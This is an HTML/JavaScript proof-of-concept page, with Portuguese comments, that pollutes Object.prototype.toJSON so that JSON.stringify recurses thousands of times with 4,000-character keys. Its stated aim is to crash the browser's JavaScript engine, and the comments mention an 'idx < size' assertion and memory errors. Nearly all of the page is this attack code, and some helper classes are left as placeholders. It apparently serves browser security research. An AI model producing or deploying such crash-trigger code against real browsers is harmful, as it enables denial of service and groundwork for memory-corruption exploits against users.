<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PoC Isolado v2.3u - Ultra Profundidade, Chaves Longas</title>
    <style> /* ... estilos como antes ... */ </style>
</head>
<body>
    <h1>PoC Isolado v2.3u - Ultra Profundidade com Chaves Longas</h1>
    <p>Tenta atingir grande profundidade de recursão com chaves longas. FOCO NO CONSOLE (PRESERVE LOG!). Pode travar feio.</p>
    <button id="runBtn" onclick="runIsolatedTest()">Iniciar Teste v2.3u</button>
    <div id="output"></div>

    <script>
        // AdvancedInt64 e generalUtils como antes...
        class AdvancedInt64 { /* ... (código completo como antes) ... */ }
        const generalUtils = { /* ... (código completo como antes) ... */ };

        const outputDivS1 = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');    
        const MEDIUM_PAUSE_S1 = 200; // Para o final do script

        const logS1 = (message, type = 'info', funcName = '') => {
            console.log(`[${type.toUpperCase()}] ${funcName ? '['+funcName+'] ' : ''}${message}`);
            const targetDiv = document.getElementById('output');
            if (targetDiv) { try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const prefix = funcName ? `[${funcName}] ` : ''; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info'; if(targetDiv.innerHTML.length > 300000){ targetDiv.innerHTML = outputDiv.innerHTML.substring(targetDiv.innerHTML.length - 150000); targetDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + targetDiv.innerHTML; } targetDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`; targetDiv.scrollTop = targetDiv.scrollHeight; } catch(e) { console.error(`Erro DENTRO de logS1 (para div):`, e); }}
        };
        // PAUSA CURTA NÃO SERÁ USADA DENTRO DO LOOP toJSON PARA MAXIMIZAR VELOCIDADE
        // const PAUSE_S1_FUNC = (ms = 10) => new Promise(r => setTimeout(r, ms)); 
        
        const testObject_u = { p1_u: "val_u1" }; // Objeto raiz ainda mais simples
        let callCount_toJSON_u = 0;
        let originalToJSON_Descriptor_u;
        const ppKey_u = 'toJSON';

        // --- Configurações para Chaves Longas e Profundidade ---
        const LONG_KEY_LENGTH_u = 4000; 
        const RECURSIVE_KEY_STRING_BASE_u = "Y".repeat(LONG_KEY_LENGTH_u) + "_KEY_"; 
        const MAX_toJSON_CALLS_u = 2500; // Tentar profundidade alta, mas menor que o estouro de pilha com chaves curtas

        function setupPrototypePollution_u() {
            callCount_toJSON_u = 0;
            originalToJSON_Descriptor_u = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_u);

            Object.prototype[ppKey_u] = function() { 
                callCount_toJSON_u++;
                // Para evitar sobrecarregar o console com logs em cada chamada de um loop tão grande,
                // logaremos apenas a cada N chamadas, e quando atingir o limite.
                const shouldLogThisCall = (callCount_toJSON_u % 200 === 0) || (callCount_toJSON_u === 1) || (callCount_toJSON_u === MAX_toJSON_CALLS_u);

                let logPrefix = `toJSON PoC v2.3u (Call ${callCount_toJSON_u})`;
                
                let thisIdentifier = "unknown_this_u";
                if (this === testObject_u && callCount_toJSON_u === 1) thisIdentifier = "ROOT_U";
                else if (Array.isArray(this)) thisIdentifier = "ARRAY_U";
                else if (this && typeof this === 'object' && this.hasOwnProperty('level_u')) thisIdentifier = `PREV_RETURN_OBJ_L${this.level_u}_U`;

                if (shouldLogThisCall) {
                    console.log(`%c${logPrefix} - INVOKED! id='${thisIdentifier}', typeof='${typeof this}', constructor='${this && this.constructor ? this.constructor.name : 'N/A'}'`, "background: #1e1e1e; color: #c586c0");
                }
                
                if (callCount_toJSON_u > MAX_toJSON_CALLS_u) { 
                    if (shouldLogThisCall || (callCount_toJSON_u === MAX_toJSON_CALLS_u + 1) ) { // Loga a primeira vez que excede
                        console.warn(`${logPrefix} - Limite de chamadas toJSON (${MAX_toJSON_CALLS_u}) atingido. Retornando string.`);
                        logS1(`${logPrefix} - Limite de chamadas toJSON (${MAX_toJSON_CALLS_u}) atingido. Retornando string.`, 'warn', 'toJSON_u');
                    }
                    return `recursion_limit_deep_long_${callCount_toJSON_u}`;
                }

                let keys = [];
                try {
                    // Não vamos logar PRESTES A CHAMAR Object.keys em todas as iterações para não poluir demais
                    keys = Object.keys(this); 
                    
                    let keysToUseInReturn;
                    if (thisIdentifier === "ROOT_U") {
                        keysToUseInReturn = keys; 
                    } else {
                        keysToUseInReturn = keys.map((key, index) => `${RECURSIVE_KEY_STRING_BASE_u}${callCount_toJSON_u}_${index}`);
                    }
                    
                    if (shouldLogThisCall) {
                        console.log(`%c${logPrefix} - Object.keys SUCESSO para id='${thisIdentifier}'. Keys p/ Retorno (amostra): ${keysToUseInReturn[0] ? keysToUseInReturn[0].substring(0,15)+"..." : "[]"}`, "color:teal");
                        logS1(`${logPrefix} - Usando ${keysToUseInReturn.length} chaves (amostra: ${keysToUseInReturn[0] ? keysToUseInReturn[0].substring(0,30)+"..." : "N/A"}).`, 'info', 'toJSON_u');
                    }
                    return { 
                        level_u: callCount_toJSON_u, 
                        payload_r_keys_u: keysToUseInReturn 
                    };

                } catch (e) {
                    console.error(`${logPrefix} - ERRO em Object.keys(this) para id='${thisIdentifier}':`, e);
                    logS1(`${logPrefix} - ERRO em Object.keys(this) para id='${thisIdentifier}': ${e.message}`, 'error', 'toJSON_u');
                    return { "error_in_toJSON_u": true, "message": String(e.message) };
                }
            };
            logS1(`Poluição Object.prototype.toJSON APLICADA (v2.3u - Ultra Profundidade, Chaves Longas, Limite: ${MAX_toJSON_CALLS_u}).`, 'good', 'setup_u');
        }

        function cleanupPrototypePollution_u() {
            if (originalToJSON_Descriptor_u) {
                Object.defineProperty(Object.prototype, ppKey_u, originalToJSON_Descriptor_u);
            } else if (Object.prototype.hasOwnProperty(ppKey_u)) {
                delete Object.prototype[ppKey_u];
            }
            logS1("Object.prototype.toJSON restaurado.", 'good', 'cleanup_u');
        }

        async function runIsolatedTest() {
            document.querySelectorAll('button').forEach(b => b.disabled = true);
            if (outputDivS1) outputDivS1.innerHTML = '';
            logS1(`==== INICIANDO PoC Isolado v2.3u (Ultra Profundidade, Chaves Longas, Limite ${MAX_toJSON_CALLS_u} - idx < size() ESPERADO?) ====`, 'test', 'runTest_u');

            setupPrototypePollution_u();
            
            logS1(`Tentando JSON.stringify em testObject_u... (PODE TRAVAR FEIO OU DEMORAR MUITO)`, 'critical', 'runTest_u');
            let result_u;
            let errorState_u = null;
            try {
                result_u = JSON.stringify(testObject_u); 
                logS1(`JSON.stringify CONCLUÍDO. Resultado (parcial): ${result_u ? String(result_u).substring(0, 300) : "N/A"}`, 'good', 'runTest_u');
            } catch (e) {
                errorState_u = e;
                logS1(`ERRO CAPTURADO por JSON.stringify: ${e.message}`, 'error', 'runTest_u');
                if (e.stack) logS1(`Stack: ${e.stack}`, 'error', 'runTest_u');
                console.error("ERRO durante JSON.stringify em runTest_u:", e);
            } finally {
                logS1("Entrou no finally de runTest_u.", 'info', 'runTest_u');
                cleanupPrototypePollution_u();
            }
            
            // await PAUSE_S1_FUNC(MEDIUM_PAUSE_S1); // Pausa no final pode não ser útil se travar
            if (errorState_u && errorState_u.toString().includes("Maximum call stack size exceeded")) {
                 logS1(`\n==== PoC Isolado v2.3u CONCLUÍDO com ESTOURO DE PILHA (Chamadas toJSON: ${callCount_toJSON_u}) ====`, 'error', 'runTest_u');
            } else if (!result_u && !errorState_u) { 
                 logS1(`\n==== PoC Isolado v2.3u CONCLUÍDO mas TRAVOU SEM ERRO CAPTURÁVEL (Chamadas toJSON: ${callCount_toJSON_u}) ====`, 'warn', 'runTest_u');
                 logS1("VERIFIQUE O CONSOLE POR CRASHES DO MOTOR JS (ex: idx < size) OU ERROS DE MEMÓRIA.", 'critical', 'runTest_u');
            } else if (errorState_u) { 
                logS1(`\n==== PoC Isolado v2.3u CONCLUÍDO COM ERRO (Chamadas toJSON: ${callCount_toJSON_u}) ====`, 'error', 'runTest_u');
            } else { 
                 logS1(`\n==== PoC Isolado v2.3u CONCLUÍDO (Chamadas toJSON: ${callCount_toJSON_u}) ====`, 'test', 'runTest_u');
            }
            document.querySelectorAll('button').forEach(b => b.disabled = false);
        }
    </script>
</body>
</html>
